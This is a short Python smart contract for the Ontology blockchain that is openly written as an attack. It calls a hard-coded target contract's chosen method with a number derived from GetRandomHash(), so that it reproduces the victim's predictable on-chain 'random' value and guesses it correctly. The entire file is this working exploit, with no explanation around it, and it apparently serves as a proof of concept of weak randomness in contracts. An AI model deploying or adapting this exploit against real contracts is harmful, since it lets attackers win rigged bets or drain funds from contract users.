from boa.interop.System.App import RegisterAppCall
from boa.interop.Ontology.Runtime import GetRandomHash

ContractToBeAttacked = RegisterAppCall('3bc5276e6b59444035e577a07f9991011ba38bf7', 'operation', 'args')

def Main(opration, args):
    if opration == "attack":
        methodToBeAttack = args[0]
        return attack(methodToBeAttack)
    return False

def attack(methodToBeAttack):

    randomNumber = getRandomNumber()

    return ContractToBeAttacked(methodToBeAttack, [randomNumber])



def getRandomNumber():
    randomHash = GetRandomHash()
    randomNumber = abs(randomHash) % 100000000
    return randomNumber